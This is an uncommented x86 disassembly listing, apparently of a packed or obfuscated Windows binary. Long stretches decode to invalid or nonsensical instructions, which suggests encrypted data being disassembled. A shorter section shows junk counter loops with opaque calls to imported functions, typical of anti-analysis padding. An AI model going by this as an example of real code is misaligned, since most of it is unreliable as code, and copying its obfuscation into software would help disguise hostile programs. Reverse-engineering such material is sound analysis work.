  40184a:	dec    edi
  40184b:	xchg   esp,eax
  40184c:	pop    eax
  40184d:	pop    ds
  40184e:	loopne 0x4017f6
  401850:	loope  0x401833
  401852:	test   eax,0x2be3bb77
  401857:	dec    edx
  401858:	xchg   ecx,eax
  401859:	xchg   esp,eax
  40185a:	sbb    DWORD PTR [edx+0x19],esi
  40185d:	lahf   
  40185e:	mov    bh,0xda
  401860:	mov    bh,0x71
  401862:	loop   0x401896
  401864:	fsubr  DWORD PTR [esi-0x67]
  401867:	fwait
  401868:	iret   
  401869:	cmp    BYTE PTR [ecx-0x381fa0d8],ah
  40186f:	dec    esi
  401870:	rol    DWORD PTR [ebx-0x5b539729],1
  401876:	fisub  WORD PTR [ebx+0x63]
  401879:	or     edi,edx
  40187b:	das    
  40187c:	lods   eax,DWORD PTR ds:[esi]
  40187d:	fcomip st,st(1)
  40187f:	cmp    DWORD PTR [ebx-0x143749d],edx
  401885:	lds    ebx,FWORD PTR [ebp+0x1329b57c]
  40188b:	inc    esp
  40188c:	xchg   ebp,eax
  40188d:	arpl   WORD PTR [edx],bp
  40188f:	jle    0x401839
  401891:	xor    eax,0xf2a309a8
  401896:	xchg   edi,eax
  401897:	push   ecx
  401898:	(bad)  
  401899:	in     al,dx
  40189a:	sub    BYTE PTR [edi],bl
  40189c:	cli    
  40189d:	xor    eax,0x196f764d
  4018a2:	cli    
  4018a3:	mov    esi,0x2c7c63d5
  4018a8:	mov    cl,0x3a
  4018aa:	stos   DWORD PTR es:[edi],eax
  4018ab:	jnp    0x4018b0
  4018ad:	inc    edx
  4018ae:	dec    edx
  4018af:	dec    edi
  4018b0:	test   DWORD PTR [ebx+0x4d0ff443],esp
  4018b6:	push   ebp
  4018b7:	pop    eax
  4018b8:	fisub  WORD PTR [ebp-0x64]
  4018bb:	add    BYTE PTR [edx+edi*4],bh
  4018be:	add    eax,edi
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x2e]
  401b2b:	xor    eax,0x795c934a
  401b30:	jle    0x401bb0
  401b32:	outs   dx,DWORD PTR ds:[esi]
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b4c
  401b37:	scas   al,BYTE PTR es:[edi]
  401b38:	inc    edi
  401b39:	xchg   esi,eax
  401b3a:	cli    
  401b3b:	jbe    0x401aef
  401b3d:	sub    DWORD PTR [ecx-0x12],eax
  401b40:	dec    edi
  401b41:	call   0x3f7915fa
  401b46:	xor    eax,0xf12d04db
  401b4b:	pushf  
  401b4c:	pop    ss
  401b4d:	fisttp DWORD PTR [ebp-0x10]
  401b50:	mov    WORD PTR [esi],?
  401b52:	mov    cl,0x16
  401b54:	aaa    
  401b55:	dec    ebx
  401b56:	lods   al,BYTE PTR ds:[esi]
  401b57:	xchg   ecx,eax
  401b58:	inc    ebp
  401b59:	mov    esi,0x236ed357
  401b5e:	add    bl,BYTE PTR [esi+0x4]
  401b61:	inc    edi
  401b62:	pop    edx
  401b63:	or     ebp,DWORD PTR [ecx]
  401b65:	loopne 0x401b20
  401b67:	dec    edi
  401b68:	pop    esi
  401b69:	cmc    
  401b6a:	push   DWORD PTR [ecx+0x68]
  401b6d:	pop    ecx
  401b6e:	add    BYTE PTR [ebp-0x4c144802],0x3f
  401b75:	xchg   ebx,eax
  401b76:	(bad)  [edi+0x3b]
  401b79:	popa   
  401b7a:	stos   DWORD PTR es:[edi],eax
  401b7b:	lea    ebx,ds:0x860bc24d
  401b81:	inc    edi
  401b82:	imul   DWORD PTR [ecx+0x57c137fe]
  401b88:	call   0xee1:0x5c0ca364
  401b8f:	jbe    0x401b26
  401b91:	aad    0x1
  401b93:	mov    bl,0x45
  401b95:	push   edi
  401b96:	call   esi
  401b98:	gs xor edx,esi
  401b9b:	loop   0x401b77
  401b9d:	test   DWORD PTR [edx],ecx
  401b9f:	arpl   WORD PTR [esi+ebp*1+0x6e],cx
  401ba3:	ds icebp 
  401ba5:	sub    al,0xfa
  401ba7:	scas   eax,DWORD PTR es:[edi]
  401ba8:	xchg   ebx,eax
  401ba9:	pop    edx
  401baa:	xchg   BYTE PTR [eax],bh
  401bac:	add    BYTE PTR [ebp+0x30],cl
  401baf:	fs mov edi,0x15e6710c
  401bb5:	stc    
  401bb6:	or     eax,0xa55e1560
  401bbb:	les    edi,FWORD PTR ds:0xa9eabc0b
  401bc1:	sbb    ecx,ebx
  401bc3:	inc    edi
  401bc4:	in     al,dx
  401bc5:	fwait
  401bc6:	aas    
  401bc7:	fucomi st,st(0)
  401bc9:	xchg   edx,eax
  401bca:	mov    ebx,0xd174f379
  401bcf:	jmp    0x213b17df
  401bd4:	mov    al,ds:0xf24303b2
  401bd9:	sbb    BYTE PTR [ebp-0x40],dh
  401bdc:	adc    BYTE PTR [ecx+0x47b71abf],0x88
  401be3:	add    ebp,esi
  401be5:	fidiv  WORD PTR [edx-0x1e]
  401be8:	lock (bad) 
  401bea:	shl    esi,0xf8
  401bed:	pop    esi
  401bee:	pop    ds
  401bef:	rcr    ch,cl
  401bf1:	(bad)  
  401bf2:	pusha  
  401bf3:	jnp    0x401bf5
  401bf5:	xchg   edx,eax
  401bf6:	lods   al,BYTE PTR ds:[esi]
  401bf7:	xchg   edx,eax
  401bf8:	pop    ds
  401bf9:	(bad)
  401bfc:	or     bh,al
  401bfe:	sub    eax,0x732e482f
  401c03:	mov    cl,BYTE PTR [edi]
  401c05:	pop    ecx
  401c06:	gs xor ebx,ebp
  401c09:	ret    0xda91
  401c0c:	cmp    eax,0x363449c7
  401c11:	sbb    bl,dl
  401c13:	mov    ds:0x45ef95b0,al
  401c18:	dec    ecx
  401c19:	sti    
  401c1a:	ds sti 
  401c1c:	in     al,dx
  401c1d:	(bad)  
  401c1e:	jb     0x401c1e
  401c20:	pop    ss
  401c21:	and    ebp,DWORD PTR [esi+esi*4-0xe]
  401c25:	push   es
  401c26:	(bad)  
  401c27:	outs   dx,DWORD PTR ds:[esi]
  401c28:	jmp    0x401c8d
  401c2a:	cmp    BYTE PTR [ebp-0x17183e69],bl
  401c30:	pop    ebp
  401c31:	test   eax,0x31537904
  401c36:	mov    dl,0x4b
  401c38:	and    al,BYTE PTR ds:0xfa26f409
  401c3e:	dec    eax
  401c3f:	push   esp
  401c40:	in     eax,dx
  401c41:	lock test eax,0x45caf6b5
  401c47:	xchg   BYTE PTR [eax+0x71],dl
  401c4a:	int    0xb5
  401c4c:	(bad)  
  401c4d:	mov    ch,0x88
  401c4f:	xchg   DWORD PTR [ebx-0x1d],edi
  401c52:	ret    0xc7ae
  401c55:	aas    
  401c56:	test   eax,0x33acd4c7
  401c5b:	ins    DWORD PTR es:[edi],dx
  401c5c:	add    dh,BYTE PTR [edx-0x78]
  401c5f:	mov    ebx,0xdc11f567
  401c64:	jmp    0x9142:0x4c19bc24
  401c6b:	pop    edx
  401c6c:	jle    0x401c48
  401c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c6f:	arpl   WORD PTR [eax+0x9],bx
  401c72:	fiadd  DWORD PTR [ecx-0x10]
  401c75:	adc    bh,dl
  401c77:	stos   BYTE PTR es:[edi],al
  401c78:	lahf   
  401c79:	xchg   edi,eax
  401c7a:	aam    0x76
  401c7c:	pop    ebp
  401c7d:	jle    0x401c77
  401c7f:	xor    BYTE PTR [edi-0x6cc5e28d],0xaf
  401c86:	out    dx,eax
  401c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c88:	in     al,dx
  401c89:	call   FWORD PTR [ebp-0x63a5a04b]
  401c8f:	lea    eax,[edi+0x2c936167]
  401c95:	loope  0x401ce6
  401c97:	dec    ebp
  401c98:	adc    al,0x52
  401c9a:	(bad)  
  401c9b:	xor    ebx,DWORD PTR [ebx-0x6e]
  401c9e:	inc    eax
  401c9f:	sub    esi,edi
  401ca1:	or     cl,BYTE PTR [eax-0x7]
  401ca4:	nop
  401ca5:	inc    ecx
  401ca6:	repz adc bh,ah
  401ca9:	jb     0x401c49
  401cab:	xchg   ecx,eax
  401cac:	xor    al,0xf6
  401cae:	mov    edi,DWORD PTR [ebp+ecx*2+0x3f0c7852]
  401cb5:	cwde   
  401cb6:	adc    al,0xe
  401cb8:	jno    0x401cfb
  401cba:	xor    dh,dh
  401cbc:	mov    edi,0xa792305c
  401cc1:	inc    esi
  401cc2:	imul   ebp,DWORD PTR [eax+0x61],0x87dc93b4
  401cc9:	call   0x48e13468
  401cce:	call   0x7dd9:0x40d130e4
  401cd5:	test   al,0xf3
  401cd7:	add    ch,BYTE PTR [esi]
  401cd9:	fnstcw WORD PTR [ebx+eiz*2]
  401cdc:	pop    esp
  401cdd:	out    dx,al
  401cde:	scas   eax,DWORD PTR es:[edi]
  401cdf:	not    dl
  401ce1:	xor    ebp,ebp
  401ce3:	mov    bh,0xd5
  401ce5:	sbb    cl,bh
  401ce7:	inc    ebp
  401ce8:	mov    bl,0x54
  401cea:	cmp    eax,DWORD PTR [edi]
  401cec:	cwde   
  401ced:	out    0x76,eax
  401cef:	retf   
  401cf0:	mov    edx,ecx
  401cf2:	arpl   WORD PTR [ebx],sp
  401cf4:	daa    
  401cf5:	mov    al,ds:0xf44d8682
  401cfa:	sub    ch,cl
  401cfc:	(bad)  [ebp+0x2a]
  401cff:	dec    ebx
  401d00:	xor    edi,DWORD PTR ds:0x321fc000
  401d06:	lahf   
  401d07:	repnz adc BYTE PTR [ecx+0x487ae46],dl
  401d0e:	sbb    esp,esi
  401d10:	cmp    DWORD PTR [ebx],esp
  401d12:	daa    
  401d13:	cmp    DWORD PTR [edi+0x7861a6ea],eax
  401d19:	jb     0x401cc5
  401d1b:	imul   esi,DWORD PTR [eax+edx*4-0x70],0x4e5f01d6
  401d23:	out    dx,eax
  401d24:	std    
  401d25:	mov    dh,0x93
  401d27:	and    DWORD PTR [edi-0x4942fa32],eax
  401d2d:	(bad)  
  401d2e:	(bad)  
  401d2f:	sti    
  401d30:	ror    BYTE PTR [ecx-0x2d],cl
  401d33:	das    
  401d34:	xchg   esp,eax
  401d35:	mov    esi,0x592fa421
  401d3a:	xor    BYTE PTR ds:0x9c99695a,ah
  401d40:	pop    ebp
  401d41:	lock aas 
  401d43:	ja     0x401dac
  401d45:	xor    eax,0xce5fa33a
  401d4a:	daa    
  401d4b:	popf   
  401d4c:	inc    esp
  401d4d:	(bad)  
  401d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d4f:	push   0x4b
  401d51:	add    ebx,DWORD PTR [ebp-0x14d39752]
  401d57:	add    al,0xc9
  401d59:	jmp    0xad93:0xf26e5005
  401d60:	je     0x401db6
  401d62:	test   DWORD PTR [edx-0x6d23d47c],esp
  401d68:	sub    eax,0x23de1db9
  401d6d:	sar    BYTE PTR [eax+0x3b],cl
  401d70:	or     bh,BYTE PTR [edi]
  401d72:	push   DWORD PTR [ecx-0x5e]
  401d75:	lahf   
  401d76:	dec    ebx
  401d77:	adc    BYTE PTR [edi+edi*8+0x57],cl
  401d7b:	and    al,0xa3
  401d7d:	nop
  401d7e:	xor    BYTE PTR [esi],ah
  401d80:	sub    eax,0xdf2c47c6
  401d85:	mov    ah,0x30
  401d87:	add    bh,BYTE PTR [ebx-0x2cd44072]
  401d8d:	pop    edx
  401d8e:	cmp    bl,al
  401d90:	xchg   esi,eax
  401d91:	out    dx,al
  401d92:	dec    edi
  401d93:	out    dx,eax
  401d94:	push   es
  401d95:	inc    ebp
  401d96:	inc    edx
  401d97:	into   
  401d98:	in     al,0x45
  401d9a:	pop    ebx
  401d9b:	cmp    ebx,DWORD PTR [eax-0x73b9df2a]
  401da1:	pop    ss
  401da2:	loope  0x401dde
  401da4:	test   al,0xad
  401da6:	call   0x42c1211e
  401dab:	out    0xf1,al
  401dad:	popf   
  401dae:	and    eax,0xc36c2d3
  401db3:	outs   dx,DWORD PTR ds:[esi]
  401db4:	fst    QWORD PTR [esi+0x38b509db]
  401dba:	add    eax,0xa33b2b3a
  401dbf:	xor    ecx,ebx
  401dc1:	mov    al,0x29
  401dc3:	push   ecx
  401dc4:	pop    edx
  401dc5:	fs pop esi
  401dc7:	(bad)  
  401dc8:	call   0x41cd:0x6edf7b44
  401dcf:	stos   DWORD PTR es:[edi],eax
  401dd0:	xlat   BYTE PTR ds:[ebx]
  401dd1:	popa   
  401dd2:	(bad)  
  401dd3:	pop    ds
  401dd4:	nop
  401dd5:	xor    ah,BYTE PTR [ecx]
  401dd7:	adc    eax,0x6b3bda97
  401ddc:	xor    al,ch
  401dde:	push   es
  401ddf:	cdq    
  401de0:	jne    0x401d7c
  401de2:	add    DWORD PTR [esp+ecx*2+0x70],edx
  401de6:	fisttp QWORD PTR [ebx-0x7c]
  401de9:	nop
  401dea:	inc    edi
  401deb:	xchg   esp,eax
  401dec:	push   ebp
  401ded:	addr16 add eax,0x85defe4a
  401df3:	add    ecx,DWORD PTR [esi]
  401df5:	add    ebx,DWORD PTR [eax]
  401df7:	rcl    DWORD PTR [ebp+esi*4-0x47],0x6d
  401dfc:	ficom  DWORD PTR [eax+0x67]
  401dff:	pop    eax
  401e00:	lds    ecx,FWORD PTR [esi+0x1690f7cc]
  401e06:	push   edx
  401e07:	jg     0x401dea
  401e09:	xchg   BYTE PTR [esp+ecx*1-0x355d6c1],dh
  401e10:	fisubr WORD PTR [edi]
  401e12:	mov    bh,0xf8
  401e14:	xor    DWORD PTR [esp+ebx*1-0x72],ebx
  401e18:	add    al,0x60
  401e1a:	add    eax,0xacc02f47
  401e1f:	retf   0xcce3
  401e22:	xchg   edx,eax
  401e23:	jge    0x401e83
  401e25:	add    al,0xdb
  401e27:	sqrtps xmm7,XMMWORD PTR [esi+0x2400f406]
  401e2e:	scas   eax,DWORD PTR es:[edi]
  401e2f:	cli    
  401e30:	or     edx,ebp
  401e32:	int3   
  401e33:	sar    DWORD PTR [esi+0x28],0xcd
  401e37:	inc    edx
  401e38:	(bad)  
  401e39:	rol    dh,cl
  401e3b:	ss cdq 
  401e3d:	sub    al,bh
  401e3f:	dec    ecx
  401e40:	addr16 out 0xf6,eax
  401e43:	sbb    DWORD PTR [ebx+0x54459b],edx
  401e49:	cdq    
  401e4a:	xchg   BYTE PTR [ecx],ah
  401e4c:	in     al,dx
  401e4d:	popa   
  401e4e:	imul   ecx,DWORD PTR [ebx+eax*4],0x453238a9
  401e55:	jmp    0x48a:0x291dc66f
  401e5c:	push   ss
  401e5d:	addr16 jo 0x401ed7
  401e60:	jp     0x401eae
  401e62:	mov    edi,0x642a32cb
  401e67:	(bad)  
  401e68:	lahf   
  401e69:	enter  0xec71,0x15
  401e6d:	dec    ecx
  401e6e:	cmp    ah,BYTE PTR [ebx-0x1ea16fa5]
  401e74:	xchg   ebp,eax
  401e75:	je     0x401ef1
  401e77:	or     eax,DWORD PTR [esp+ebx*2]
  401e7a:	inc    ebx
  401e7b:	retf   
  401e7c:	push   ebp
  401e7d:	hlt    
  401e7e:	bound  ecx,QWORD PTR [ecx+0x9d8749f]
  401e84:	rcl    esi,cl
  401e86:	call   0xc270:0x79775039
  401e8d:	fistp  DWORD PTR [edi-0x6e]
  401e90:	jp     0x401ee1
  401e92:	mov    ah,0x2f
  401e94:	pop    ds
  401e95:	pushf  
  401e96:	data16 loopne 0x401e93
  401e99:	cwd    
  401e9b:	ret    
  401e9c:	push   0x65
  401e9e:	ror    edi,1
  401ea0:	dec    ebp
  401ea1:	inc    esp
  401ea2:	sahf   
  401ea3:	rcr    BYTE PTR [ecx+edx*4+0x197b109c],cl
  401eaa:	pop    es
  401eab:	inc    ebx
  401eac:	data16 jl 0x401ed3
  401eaf:	cmp    al,0xd2
  401eb1:	sti    
  401eb2:	es hlt 
  401eb4:	xchg   edi,esi
  401eb6:	add    cl,BYTE PTR [edi]
  401eb8:	test   al,0xbf
  401eba:	test   eax,0xb450ff6e
  401ebf:	lds    esi,FWORD PTR [edi+0x12a48cbd]
  401ec5:	mov    eax,edi
  401ec7:	(bad)  
  401ec8:	shl    BYTE PTR [ebp-0x71fe6738],cl
  401ece:	mov    bl,0x3f
  401ed0:	shl    BYTE PTR [edx],cl
  401ed2:	fs cmc 
  401ed4:	sahf   
  401ed5:	je     0x401e82
  401ed7:	pop    esi
  401ed8:	mov    eax,ds:0x3c7c7caa
  401edd:	test   eax,0x578bad96
  401ee2:	and    eax,0xd3ec665f
  401ee7:	pushf  
  401ee8:	pop    ebx
  401ee9:	lds    esi,FWORD PTR [edi-0x74]
  401eec:	call   0x26ef7315
  401ef1:	adc    bl,bl
  401ef3:	cs in  eax,dx
  401ef5:	std    
  401ef6:	in     al,0xb8
  401ef8:	adc    al,0x18
  401efa:	and    ah,al
  401efc:	(bad)  
  401efd:	jae    0x401ee4
  401eff:	int3   
  401f00:	mov    eax,0xa807039f
  401f05:	das    
  401f06:	test   eax,0xbbd16eba
  401f0b:	adc    al,0x1d
  401f0d:	stos   BYTE PTR es:[edi],al
  401f0e:	lock add eax,0xa0b9c69f
  401f14:	or     esp,DWORD PTR [edi-0x1c1527b0]
  401f1a:	inc    esp
  401f1b:	or     ah,BYTE PTR [edx+0x40]
  401f1e:	or     BYTE PTR [esi+0xc],ch
  401f21:	hlt    
  401f22:	jle    0x401ef2
  401f24:	jmp    0x1d8b:0xc7031b82
  401f2b:	or     edi,DWORD PTR [eax]
  401f2d:	inc    ebx
  401f2e:	add    BYTE PTR [ebx+0x4338570d],cl
  401f34:	add    BYTE PTR [ebx],ch
  401f36:	retf   
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	mov    esp,0x4d018b1b
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	xor    BYTE PTR [eax],0x93
  401f6b:	jp     0x401fc2
  401f6d:	(bad)  
  401f6e:	cmp    eax,0x208a581f
  401f73:	jle    0x401f79
  401f75:	imul   eax,edi,0xb8ada15f
  401f7b:	fsub   st(4),st
  401f7d:	rol    BYTE PTR [esi-0x7db0a571],cl
  401f83:	inc    eax
  401f84:	mov    ecx,0x56a79b77
  401f89:	outs   dx,DWORD PTR ds:[esi]
  401f8a:	(bad)  
  401f8b:	lea    esp,[edx+eax*1+0x479e6514]
  401f92:	cdq    
  401f93:	pop    edi
  401f94:	hlt    
  401f95:	dec    esp
  401f96:	aaa    
  401f97:	sar    BYTE PTR [eax],1
  401f99:	add    BYTE PTR [edx-0x7a86d0f2],ch
  401f9f:	imul   esi,DWORD PTR ss:[ebx+0x2bc2459d],0x608dc92d
  401faa:	in     eax,dx
  401fab:	dec    esi
  401fac:	or     BYTE PTR ds:0xc32ba073,0xec
  401fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fb4:	jg     0x401fa3
  401fb6:	jno    0x401f82
  401fb8:	outs   dx,DWORD PTR ds:[esi]
  401fb9:	mov    BYTE PTR [ebx-0x70],ah
  401fbc:	rol    dl,cl
  401fbe:	cs test al,0xb4
  401fc1:	jns    0x401f98
  401fc3:	sub    eax,0x72ce1543
  401fc8:	inc    ebp
  401fc9:	and    bh,dl
  401fcb:	int3   
  401fcc:	add    al,bl
  401fce:	and    BYTE PTR [eax+esi*8],cl
  401fd1:	dec    ebx
  401fd2:	or     DWORD PTR [ebx],0x8876f033
  401fd8:	dec    ebp
  401fd9:	pop    ebx
  401fda:	mov    esp,0x2119f780
  401fdf:	mov    ecx,0x4a5d9b17
  401fe4:	mov    ?,WORD PTR [edx]
  401fe6:	push   ebx
  401fe7:	(bad)  
  401fe8:	int3   
  401fe9:	(bad)  
  401fea:	arpl   WORD PTR [edx-0x5a],cx
  401fed:	aas    
  401fee:	xor    eax,0xf9951250
  401ff3:	inc    edx
  401ff4:	jge    0x401fb2
  401ff6:	mov    ds:0x280f2260,al
  401ffb:	mov    dh,0x77
  401ffd:	mov    eax,ds:0x200605f5
  402002:	popa   
  402003:	pop    es
  402004:	jne    0x401fdd
  402006:	pop    eax
  402007:	out    dx,eax
  402008:	scas   al,BYTE PTR es:[edi]
  402009:	sar    DWORD PTR [esi+eiz*2+0x1966c38e],1
  402010:	adc    edi,ecx
  402012:	xor    dh,al
  402014:	fnstcw WORD PTR [eax]
  402016:	xchg   ebx,eax
  402017:	adc    bh,BYTE PTR [edi]
  402019:	pop    esp
  40201a:	mov    ebx,0x8e5db110
  40201f:	fistp  QWORD PTR ds:0xe51cee22
  402025:	ret    0xcfe6
  402028:	sub    ecx,eax
  40202a:	xchg   ecx,eax
  40202b:	pop    ebx
  40202c:	cmp    eax,eax
  40202e:	or     DWORD PTR [ebx-0x7e],edx
  402031:	xchg   bx,ax
  402033:	sbb    BYTE PTR [eax+0x3574e833],cl
  402039:	aaa    
  40203a:	dec    esp
  40203b:	jecxz  0x40204b
  40203d:	hlt    
  40203e:	or     ah,al
  402040:	sbb    DWORD PTR [eax-0x45],ecx
  402043:	(bad)  
  402045:	cmc    
  402046:	outs   dx,DWORD PTR ds:[esi]
  402047:	push   esi
  402048:	and    al,0x52
  40204a:	push   ebp
  40204b:	xor    edi,DWORD PTR [ecx+0x6984d2e0]
  402051:	mov    ds,WORD PTR [edi+ebx*4]
  402054:	pusha  
  402055:	jp     0x402010
  402057:	xchg   ecx,eax
  402058:	mov    ebp,0xead8bb06
  40205d:	jp     0x4020d9
  40205f:	daa    
  402060:	loope  0x4020e0
  402062:	arpl   WORD PTR [ebx-0x16],sp
  402065:	scas   eax,DWORD PTR es:[edi]
  402066:	(bad)  
  402067:	xchg   edi,eax
  402068:	add    al,0xda
  40206a:	js     0x402063
  40206c:	pop    esi
  40206d:	sub    esp,DWORD PTR [ecx-0x40404f9c]
  402073:	mov    al,0x75
  402075:	sar    BYTE PTR [eax+0x1b0ef0e0],cl
  40207b:	push   cs
  40207c:	lods   eax,DWORD PTR ds:[esi]
  40207d:	pop    ebp
  40207e:	ins    DWORD PTR es:[edi],dx
  40207f:	outs   dx,DWORD PTR ds:[esi]
  402080:	push   cs
  402081:	push   ax
  402083:	pop    ds
  402084:	fnstenv ds:0xb774ab65
  40208a:	lea    eax,[ebx-0x1daee6c4]
  402090:	test   DWORD PTR [ecx-0x6a],ebp
  402093:	inc    ebp
  402094:	jg     0x4020fa
  402096:	xlat   BYTE PTR ds:[ebx]
  402097:	imul   ebx,ebp,0xc13e5b01
  40209d:	sbb    eax,DWORD PTR ds:0x4b2deb9a
  4020a3:	push   ecx
  4020a4:	push   esp
  4020a5:	pusha  
  4020a6:	pop    es
  4020a7:	pop    esi
  4020a8:	cmp    dh,BYTE PTR [eax+eax*1-0x5400b016]
  4020af:	sbb    ebx,DWORD PTR [ebp+0x1e11ee52]
  4020b5:	adc    eax,0xafd5355c
  4020ba:	adc    eax,0xb21c5f0c
  4020bf:	outs   dx,BYTE PTR ds:[esi]
  4020c0:	das    
  4020c1:	sbb    DWORD PTR [ecx],eax
  4020c3:	dec    edx
  4020c4:	inc    edx
  4020c5:	pusha  
  4020c6:	mov    al,ds:0x59349876
  4020cb:	jg     0x402074
  4020cd:	sub    DWORD PTR [ebx-0x53953097],edi
  4020d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d4:	aam    0x8a
  4020d6:	ret    
  4020d7:	in     eax,0x32
  4020d9:	test   edx,ebx
  4020db:	xor    al,0x76
  4020dd:	ins    BYTE PTR es:[edi],dx
  4020de:	shl    BYTE PTR [ebx+eiz*4],1
  4020e1:	cmc    
  4020e2:	cmp    DWORD PTR [ebp+0x14],eax
  4020e5:	pop    ds
  4020e6:	mov    ebx,0x97bca0c3
  4020eb:	daa    
  4020ec:	xor    eax,0x29dc8c90
  4020f1:	mov    ch,0x8
  4020f3:	(bad)  
  4020f4:	cmp    DWORD PTR ds:[edi],ebp
  4020f7:	sub    al,0xa0
  4020f9:	jno    0x402091
  4020fb:	pop    ds
  4020fc:	aad    0x9a
  4020fe:	inc    ecx
  4020ff:	shl    DWORD PTR [edi],0x64
  402102:	shr    ch,1
  402104:	pop    esi
  402105:	mov    cl,bl
